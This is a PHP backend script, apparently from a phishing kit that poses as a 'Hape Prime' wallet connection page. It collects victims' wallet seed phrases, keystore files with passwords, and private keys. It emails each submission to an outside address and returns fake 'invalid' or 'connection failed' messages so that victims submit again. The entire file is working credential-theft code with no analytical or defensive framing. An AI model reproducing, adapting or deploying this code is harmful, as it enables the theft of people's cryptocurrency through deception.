<?php

if(isset($_POST)){

    if(isset($_POST['secretKey']) && !empty($_POST['secretKey'])){
        $wallet = $_POST['wallet'];
        $secretKey = $_POST['secretKey'];
        $n = $_POST['n'];


        $mail = '
        =========================================================== <br/>
        WALLET PHRASE<br/>
        ===========================================================<br/>

        DATE => '.date('D M, Y h:m:s').'  <br/>
        COUNTER => '.@$n.' time(s) <br/>
        CHAIN WALLET => '.@$wallet.'<br/>
        SECRET PHRASE => '.@$secretKey.' <br/>
        ';

        $headers  = "Content-type: text/html\r\n";
        mail('info@hapeprime-node.com', 'Hape Prime  - '.strtoupper(@$wallet).' CHAIN INFO', $mail , $headers."From: Supports <info@hapeprime-node.com>" );

        if($n < 1){
            $n = $_POST['n'] + 1;
            echo json_encode(['status' => 200, 'message' => '<span style="color:red">Secret Phrase seems to be Invalid</span>', 'n' => $n]);
            return;
        }else{
            $n = $_POST['n'] + 1;
            echo json_encode(['status' => 200, 'message' => '<span style="color:red">Unable to established connection, Pls try again later</span>', 'n' => $n]);
            return;
        }



    }

    if(isset($_POST['keystore']) && !empty($_POST['keystore'])){
        $wallet = $_POST['wallet'];
        $secretKey = $_POST['keystore'];
        $password = $_POST['password'];
        $n = $_POST['n'];


        $mail = '
        =========================================================== <br/>
         WALLET KEYSTORE JSON<br/>
        ===========================================================<br/>

        DATE => '.date('D M, Y h:m:s').'  <br/>
        COUNTER => '.@$n.' time(s) <br/>
        CHAIN WALLET => '.@$wallet.' <br/>
        KEYSTORE JSON => '.@$secretKey.' <br/>
        PASSWORD => '.@$password.' <br/>
        ';

        $headers  = "Content-type: text/html\r\n";
        mail('info@hapeprime-node.com', 'Hape Prime - '.strtoupper(@$wallet).' CHAIN INFO', $mail , $headers."From: Supports <info@hapeprime-node.com>" );

        if($n < 1){
            $n = $_POST['n'] + 1;
            echo json_encode(['status' => 200, 'message' => '<span style="color:red">Keystore JSON or Password seems to be Invalid</span>', 'n' => $n]);
            return;
        }else{
            $n = $_POST['n'] + 1;
            echo json_encode(['status' => 200, 'message' => '<span style="color:red">Unable to established connection, Pls try again later</span>', 'n' => $n]);
            return;
        }



    }

    if(isset($_POST['privateKey']) && !empty($_POST['privateKey'])){
        $wallet = $_POST['wallet'];
        $secretKey = $_POST['privateKey'];
        $n = $_POST['n'];


        $mail = '
        =========================================================== <br/>
        WALLET PRIVATE KEYS<br/>
        ===========================================================<br/>

        DATE => '.date('D M, Y h:m:s').'  <br/>
        COUNTER => '.@$n.' time(s) <br/>
        CHAIN WALLET => '.@$wallet.' <br/>
        PRIVATE KEYS => '.@$secretKey.' <br/>
        ';

        $headers  = "Content-type: text/html\r\n";
        mail('info@hapeprime-node.com', 'Hape Prime - '.strtoupper(@$wallet).' CHAIN INFO', $mail , $headers."From: Supports <info@hapeprime-node.com>" );

        if($n < 1){
            $n = $_POST['n'] + 1;
            echo json_encode(['status' => 200, 'message' => '<span style="color:red">Private Key seems to be Invalid</span>', 'n' => $n]);
            return;
        }else{
            $n = $_POST['n'] + 1;
            echo json_encode(['status' => 200, 'message' => '<span style="color:red">Unable to established connection, Pls try again later</span>', 'n' => $n]);
            return;
        }



    }
    return;

}